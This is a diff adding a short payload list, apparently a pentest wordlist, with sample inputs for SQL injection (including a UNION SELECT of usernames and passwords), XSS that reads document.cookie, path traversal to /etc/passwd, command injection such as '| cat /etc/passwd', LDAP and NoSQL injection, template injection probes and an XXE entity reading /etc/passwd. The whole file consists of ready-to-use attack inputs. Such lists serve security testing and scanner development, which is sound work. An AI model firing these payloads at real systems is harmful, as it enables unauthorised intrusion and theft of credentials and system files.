@@ -1,0 +1,42 @@
+# SQL Injection - 
+
+' OR '1'='1 --
+admin' --
+' UNION SELECT username,password FROM users --
+' OR 1=1#
+
+# XSS 
+
+<script>alert('XSS')</script>
+<img src=x onerror=alert(1)>
+"><script>alert(document.cookie)</script>
+
+# Path Traversal
+
+../../etc/passwd
+..\..\Windows\System32\drivers\etc\hosts
+../../../../boot.ini
+
+# Command Injection
+
+; whoami
+&& dir
+| cat /etc/passwd
+; ping 127.0.0.1
+
+# LDAP Injection
+
+*)(uid=*))(|(uid=*
+
+# NoSQL Injection
+
+{"$ne": null}
+
+# SSTI 
+
+{{7*7}}
+${7*7}
+
+# XXE 
+
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
